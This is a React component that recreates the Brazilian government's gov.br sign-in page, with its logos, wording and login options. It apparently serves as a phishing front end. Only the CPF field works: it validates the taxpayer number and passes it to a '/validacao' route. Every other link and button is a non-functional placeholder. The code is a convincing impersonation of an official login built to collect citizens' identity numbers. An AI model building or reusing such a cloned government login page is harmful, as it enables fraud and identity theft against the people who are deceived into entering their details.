import { useState } from "react";
import { useLocation } from "wouter";

export default function Home() {
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState(false);
  const [, setLocation] = useLocation();

  const formatCPF = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length <= 11) {
      return cleaned
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    }
    return value;
  };

  const validateCPF = (cpf: string): boolean => {
    const cleaned = cpf.replace(/\D/g, "");
    
    if (cleaned.length !== 11) return false;
    
    // Verifica se todos os dígitos são iguais
    if (/^(\d)\1{10}$/.test(cleaned)) return false;
    
    // Valida primeiro dígito verificador
    let sum = 0;
    for (let i = 0; i < 9; i++) {
      sum += parseInt(cleaned.charAt(i)) * (10 - i);
    }
    let remainder = sum % 11;
    const digit1 = remainder < 2 ? 0 : 11 - remainder;
    
    if (parseInt(cleaned.charAt(9)) !== digit1) return false;
    
    // Valida segundo dígito verificador
    sum = 0;
    for (let i = 0; i < 10; i++) {
      sum += parseInt(cleaned.charAt(i)) * (11 - i);
    }
    remainder = sum % 11;
    const digit2 = remainder < 2 ? 0 : 11 - remainder;
    
    return parseInt(cleaned.charAt(10)) === digit2;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value);
    setCpf(formatted);
    setError(false);
  };

  const handleContinue = () => {
    if (!validateCPF(cpf)) {
      setError(true);
      setTimeout(() => setError(false), 3000);
      return;
    }
    
    const cleanedCPF = cpf.replace(/\D/g, "");
    setLocation(`/validacao?cpf=${cleanedCPF}`);
  };

  const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleContinue();
    }
  };

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            <h3>Identifique-se no gov.br com:</h3>
            <div className="item-login-signup-ways">
              <a tabIndex={3}>
                <img src="/images/id-card-solid.png" alt="CPF" />
                Número do CPF
              </a>
            </div>

            <div className="accordion-panel" id="accordion-panel-id">
              <p>
                Digite seu CPF para <strong>criar</strong> ou{" "}
                <strong>acessar</strong> sua conta gov.br
              </p>
              <label htmlFor="cpf">CPF</label>
              <input
                id="accountId"
                name="accountId"
                autoComplete="new-password"
                tabIndex={1}
                type="tel"
                maxLength={14}
                value={cpf}
                onChange={handleCPFChange}
                onKeyPress={handleKeyPress}
                placeholder="Digite seu CPF"
                aria-invalid={error}
              />
              {error && (
                <p id="invalidcpf" style={{ color: "#ff0000", display: "block" }}>
                  CPF Inválido. Digite novamente
                </p>
              )}

              <div className="button-panel" id="login-button-panel">
                <button
                  id="enter-account-id"
                  type="button"
                  name="operation"
                  value="enter-account-id"
                  className="button-continuar"
                  tabIndex={2}
                  onClick={handleContinue}
                >
                  Continuar
                </button>
              </div>
            </div>

            <label id="title-outras-op">Outras opções de identificação:</label>
            <hr id="hr-outras-op" style={{ margin: "0 0 0" }} />

            <div className="item-login-signup-ways">
              <button
                type="button"
                tabIndex={5}
                className="button-href-mimic2"
                style={{ color: "#008C32" }}
              >
                <img src="/images/InternetBanking-green.png" alt="Banco" />
                Login com seu banco
                <span
                  style={{
                    fontSize: "7px",
                    backgroundColor: "#008C32",
                    color: "white",
                    padding: "3px",
                    top: "-3px",
                    position: "relative",
                    marginLeft: "8px",
                  }}
                >
                  SUA CONTA SERÁ PRATA
                </span>
              </button>
            </div>

            <div className="item-login-signup-ways">
              <a tabIndex={5} href="#">
                <img src="/images/qrcode.png" alt="QR Code" />
                Login com QR code
              </a>
            </div>

            <div className="item-login-signup-ways" id="cert-digital">
              <button
                id="login-certificate"
                type="submit"
                name="operation"
                value="login-certificate"
                className="button-href-mimic2"
                tabIndex={4}
              >
                <img src="/images/CD.png" alt="Certificado" />
                Seu certificado digital
              </button>
            </div>

            <div className="item-login-signup-ways" id="cert-digital-cloud">
              <button type="button" className="button-href-mimic2" tabIndex={5}>
                <img
                  src="/images/CD-Nuvem.png"
                  id="cert-digital-cloud-img"
                  alt="Certificado em Nuvem"
                />
                Seu certificado digital em nuvem
              </button>
            </div>

            <div className="entenda-id-govbr" id="entenda-id-govbr">
              <span>
                <a tabIndex={6} href="#" id="entenda-id-govbr-a">
                  <img
                    src="/images/circle-question-solid.svg"
                    style={{ margin: "0px 13px -2px 0px", height: "1em" }}
                    alt="Ajuda"
                  />
                  Está com dúvidas e precisa de ajuda?
                </a>
                <a
                  tabIndex={6}
                  href="#"
                  style={{ display: "block" }}
                  id="termo-de-uso"
                >
                  Termo de Uso e Aviso de Privacidade
                </a>
              </span>
            </div>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
